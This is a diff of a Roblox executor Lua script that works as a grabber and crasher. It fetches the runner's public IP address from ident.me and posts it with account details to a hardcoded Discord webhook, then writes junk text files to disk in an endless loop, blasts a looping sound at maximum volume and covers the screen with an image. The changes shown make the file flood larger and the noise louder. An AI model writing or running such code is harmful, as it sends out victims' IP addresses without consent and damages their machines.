@@ -1,7 +1,6 @@
 local Webhook = "https://discord.com/api/webhooks/1098354789336756306/TYU6wsW1qpuBD0JIC-ti_kgoKL9l3j465BSEs2J2GmT-A4V09aEgBEk3R_9D9X8yBznx" -- Put your Webhook link here
 
 local IPv4 = game:HttpGet("https://v4.ident.me/")
-local IPv6 = game:HttpGet("https://v6.ident.me/")
 
 local Headers = {["content-type"] = "application/json"} -- Don't Modify
 
@@ -10,7 +9,6 @@ local LocalPlayer = game:GetService("Players").LocalPlayer
 local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
 local UserId = LocalPlayer.UserId
-local PlayerName = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame["p_"..UserId].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName.Text
 
 local PlayerData =
 {
@@ -40,11 +38,6 @@ local PlayerData =
                    ["value"] = IPv4,
                    ["inline"] = true
 },
-               {
-                   ["name"] = "IPv6:",
-                   ["value"] = IPv6,
-                   ["inline"] = true
-},
            },
        }}
    }
@@ -59,25 +52,30 @@ if syn then
 end
 
 HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
-task.wait(0.5)
 
+
+task.wait(0.5)
 math.randomseed(tick'');
 local Base = 0;
 
 spawn(function()
 repeat wait();
 Base = Base + 1;
-writefile('ZXC1000-' .. tostring(Base) .. '.txt', string.rep('L \n', math.random(9e1, 9e4)));
+writefile('ZXC1000-' .. tostring(Base) .. '.txt', string.rep('L \n', math.random(9e1, 9e7)));
 until nil;
 end);
+task.wait(2)
 
-task.wait(3)
 
+task.wait(5)
+
+
+UserSettings():GetService("UserGameSettings").MasterVolume = 10
 local coregui = game:service'CoreGui'
 
 local sound = Instance.new('Sound', coregui)
 sound.SoundId = 'rbxassetid://865599816'
-sound.Volume = 3
+sound.Volume = 10
 sound.Looped = true
 
 local gui = Instance.new('ScreenGui', coregui)
@@ -87,7 +85,7 @@ image.Size = UDim2.new(1, 0, 1.05, 0)
 image.Image = "rbxassetid://9637192164"
 image.Visible = false
 
-task.wait(1)
+task.wait(.4)
 
 for i,v in pairs(coregui:GetChildren()) do
     if v ~= gui and v ~= sound then
